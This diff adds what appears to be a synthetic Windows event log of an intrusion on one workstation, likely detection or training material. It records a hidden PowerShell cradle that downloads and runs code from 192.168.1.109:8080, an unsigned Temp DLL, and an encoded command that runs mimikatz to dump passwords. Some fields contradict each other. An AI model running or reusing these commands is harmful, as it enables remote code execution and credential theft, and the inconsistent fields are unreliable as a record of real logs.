@@ -1,0 +1,56 @@
+_time=2023-10-27T14:38:09.500-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4624 user=NT AUTHORITY\\SYSTEM Logon_Type=5
+Message=An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION-042$ Account Domain: WORKGROUP Logon ID: 0x3e7 Logon Information: Logon Type: 5 (Service)
+
+_time=2023-10-27T14:38:10.112-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4624 user=WORKSTATION-042\\msb Logon_Type=2
+Message=An account was successfully logged on. Subject: Security ID: S-1-5-18 Account Name: WORKSTATION-042$ Account Domain: WORKGROUP Logon ID: 0x3e7 Logon Information: Logon Type: 2
+
+_time=2023-10-27T14:38:10.115-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4672 user=WORKSTATION-042\\msb
+Message=Special privileges assigned to new logon. Subject: Security ID: S-1-5-21-1234567890-123456789-1234567890-1001 Account Name: msb Privileges: SeSecurityPrivilege, SeBackupPrivilege, SeRestorePrivilege, SeTakeOwnershipPrivilege, SeDebugPrivilege
+
+_time=2023-10-27T14:38:11.234-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM
+Message=A new process has been created. Creator Process ID: 788 Creator Process Name: C:\Windows\System32\services.exe New Process ID: 3120 New Process Name: C:\Windows\System32\WMIPrvSE.exe
+
+_time=2023-10-27T14:38:11.891-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM process_id=4 process_name=\\Device\\HarddiskVolume2\\Windows\\System32\\services.exe
+Message=A new process has been created. Creator Process ID: 584 Creator Process Name: C:\Windows\System32\svchost.exe New Process ID: 6012 New Process Name: C:\Program Files\Windows Defender\MsMpEng.exe
+
+_time=2023-10-27T14:38:12.100-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=Microsoft-Windows-Security-Auditing log_name=Security event_code=4624 user=WORKSTATION-042\\msb
+Message=An account was successfully logged on. Subject: Security ID: S-1-5-21-1234567890-123456789-1234567890-1001 Account Name: msb Account Domain: WORKSTATION-042 Logon ID: 0x4F5E6 Logon Information: Logon Type: 3 Logon Process: sshd Authentication Package: Negotiate Source Network Address: 185.19.85.34 Source Port: 58174
+
+_time=2023-10-27T14:38:12.456-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM process_id=1337 process_name=C:\\Windows\\System32\\svchost.exe parent_process_id=788 parent_process_name=C:\\Windows\\System32\\services.exe
+Message=A new process has been created. Creator Process ID: 8452 Creator Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe New Process ID: 9124 New Process Name: C:\Windows\System32\cmd.exe Command Line: powershell.exe -w hidden -c "$a='http://';$b='192.168.1.109';$c=':8080';iex(New-Object Net.WebClient).DownloadString($a+$b+$c)"
+
+_time=2023-10-27T14:38:13.201-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=WORKSTATION-042\\msb process_id=7654 process_name=C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe
+Message=A new process has been created. Creator Process ID: 7112 Creator Process Name: C:\Windows\explorer.exe New Process ID: 7654 New Process Name: C:\Program Files\Google\Chrome\Application\chrome.exe
+
+_time=2023-10-27T14:38:13.999-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=WORKSTATION-042\\msb
+Message=A new process has been created. Creator Process ID: 7654 Creator Process Name: C:\Program Files\Google\Chrome\Application\chrome.exe New Process ID: 7680 New Process Name: C:\Program Files\Google\Chrome\Application\chrome.exe --type=utility --lang=en-US
+
+_time=2023-10-27T14:38:14.100-04:00 sourcetype=WinEventLog:Microsoft-Windows-Windows-Firewall-With-Advanced-Security/Firewall host=WORKSTATION-042 source=WinEventLog:Microsoft-Windows-Windows-Firewall-With-Advanced-Security/Firewall event_code=2004
+Message=A rule has been added to the Windows Defender Firewall exception list. Profile: Domain,Private,Public Rule Name: Google Chrome
+
+_time=2023-10-27T14:38:15.543-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4698 user=NT AUTHORITY\\SYSTEM
+Message=A scheduled task was created. Task Name: \Microsoft\Windows\UpdateOrchestrator\USO_Broker_Display
+
+_time=2023-10-27T14:38:16.050-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM
+Message=A new process has been created. Creator Process ID: 788 Creator Process Name: C:\Windows\System32\services.exe New Process ID: 4104 New Process Name: C:\Windows\System32\taskhostw.exe
+
+_time=2023-10-27T14:38:17.300-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4624 user=NT AUTHORITY\\ANONYMOUS LOGON Logon_Type=3
+Message=An account was successfully logged on. Subject: Security ID: S-1-5-7 Account Name: ANONYMOUS LOGON Account Domain: NT AUTHORITY Logon ID: 0x1a2b3c
+
+_time=2023-10-27T14:38:18.800-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM
+Message=A new process has been created. Creator Process ID: 584 Creator Process Name: C:\Windows\System32\svchost.exe New Process ID: 8888 New Process Name: C:\Windows\System32\audiodg.exe
+
+_time=2023-10-27T14:38:20.123-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4634 user=NT AUTHORITY\\ANONYMOUS LOGON
+Message=An account was successfully logged off. Subject: Security ID: S-1-5-7 Account Name: ANONYMOUS LOGON Account Domain: NT AUTHORITY Logon ID: 0x1a2b3c
+
+_time=2023-10-27T14:38:22.450-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4799 user=WORKSTATION-042\\msb
+Message=A security-enabled local group membership was enumerated. Subject: Security ID: S-1-5-21-1234567890-123456789-1234567890-1001 Account Name: msb
+
+_time=2023-10-27T14:38:25.100-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=NT AUTHORITY\\SYSTEM
+Message=A new process has been created. Creator Process ID: 584 Creator Process Name: C:\Windows\System32\svchost.exe New Process ID: 9520 New Process Name: C:\Windows\System32\RuntimeBroker.exe
+
+_time=2023-10-27T14:38:26.150-04:00 sourcetype=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational host=WORKSTATION-042 source=XmlWinEventLog:Microsoft-Windows-Sysmon/Operational log_name=Microsoft-Windows-Sysmon/Operational event_code=7
+Message=Image loaded: ProcessId=7112 ProcessGuid={1a2b3c4d-5e6f-7a8b-9c0d-1e2f3a4b5c6d} Image=C:\Windows\explorer.exe ImageLoaded=C:\Users\msb\AppData\Local\Temp\msbcore.dll Hashes=MD5=E5D9C257A3149195E6B2F3C9E1C2D3B4,SHA256=... Signed=false SignatureStatus=Invalid
+
+_time=2023-10-27T14:38:26.345-04:00 sourcetype=WinEventLog:Security host=WORKSTATION-042 source=WinEventLog:Security log_name=Security event_code=4688 user=WORKSTATION-042\\msb
+Message=A new process has been created. Creator Process ID: 7112 Creator Process Name: C:\Windows\explorer.exe New Process ID: 9940 New Process Name: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe Command Line: powershell.exe -EncodedCommand JgAgACQAZQBuAHYAOgB0AGUAbQBwAFwAbQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIAAnAHAAcgBpAHYAaQBsAGUAZwBlADoAOgBkAGUAYgB1AGcAJwAgACcAcwBlAGsAdQByAGwAcwBhADoAOgBsAG8AZwBvAG4AcABhAHMAcwB3AG8AcgBkAHMAJwAgACcAZQB4AGkAdAAnACAA
